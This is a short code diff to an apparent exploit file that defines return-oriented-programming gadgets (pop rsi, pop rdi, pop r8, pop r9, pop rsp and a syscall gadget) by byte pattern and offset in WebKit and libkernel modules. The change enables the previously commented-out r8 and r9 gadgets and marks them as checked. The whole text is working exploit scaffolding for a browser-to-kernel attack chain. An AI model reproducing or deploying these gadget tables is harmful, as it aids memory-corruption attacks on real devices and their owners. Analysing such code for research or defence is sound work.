@@ -7,10 +7,10 @@ var gadgets = {
 	
 	"pop rsi": new gadget([0x5e], WEBKIT2, 0x18E783C), //checked ok
 	"pop rdi": new gadget([0x5f], WEBKIT2, 0x18E7840), //checked ok
-	/*
-	"pop r8": new gadget([0x41, 0x58], WEBKIT2, 0xB78FD), //not checked										
-	"pop r9": new gadget([0x43, 0x59], WEBKIT2, 0x1D90204), //not checked
-	*/
+
+	"pop r8": new gadget([0x41, 0x58], WEBKIT2, 0xB78FD), //checked OK										
+	"pop r9": new gadget([0x43, 0x59], WEBKIT2, 0x1D90204), //checked OK
+
 	"pop rsp": new gadget([0xf3, 0x5c], WEBKIT2, 0x1B5BB39), //checked OK
  
 	"mov r10, rcx; syscall": new gadget([0x49, 0x89, 0xca, 0x0f, 0x05], LIBKERNEL, 0x417), //checked OK
